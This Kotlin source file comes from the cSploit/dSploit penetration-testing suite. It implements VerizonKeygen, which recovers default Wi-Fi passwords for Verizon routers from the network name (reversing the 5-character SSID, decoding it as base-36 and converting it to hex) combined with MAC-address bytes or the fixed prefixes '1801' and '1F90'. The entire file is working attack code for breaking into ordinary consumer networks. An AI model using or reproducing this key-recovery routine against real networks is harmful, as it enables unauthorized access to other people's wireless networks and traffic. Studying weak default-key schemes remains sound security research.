/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.csploit.strix.data.wifi.algorithms

import org.csploit.strix.data.wifi.Keygen

class VerizonKeygen(
    ssid: String, mac: String, level: Int, enc: String
) : Keygen(ssid, mac, level, enc) {

    override fun getKeys(): List<String>? {
        if (this.ssid.length != 5) {
            errorMessage = "Invalid ESSID! It must have 5 characters."
            return null
        }
        val inverse = CharArray(5)
        inverse[0] = this.ssid[4]
        inverse[1] = this.ssid[3]
        inverse[2] = this.ssid[2]
        inverse[3] = this.ssid[1]
        inverse[4] = this.ssid[0]

        val result: Int = try {
            Integer.valueOf(String(inverse), 36)
        } catch (e: NumberFormatException) {
            errorMessage = "Error processing this SSID."
            return null
        }

        var ssidKey = Integer.toHexString(result).uppercase()
        while (ssidKey.length < 6) ssidKey = "0$ssidKey"

        if (this.mac.isNotEmpty()) {
            addPassword(this.mac.substring(3, 5) + this.mac.substring(6, 8) + ssidKey)
        } else {
            addPassword("1801$ssidKey")
            addPassword("1F90$ssidKey")
        }
        return getResults()
    }
}
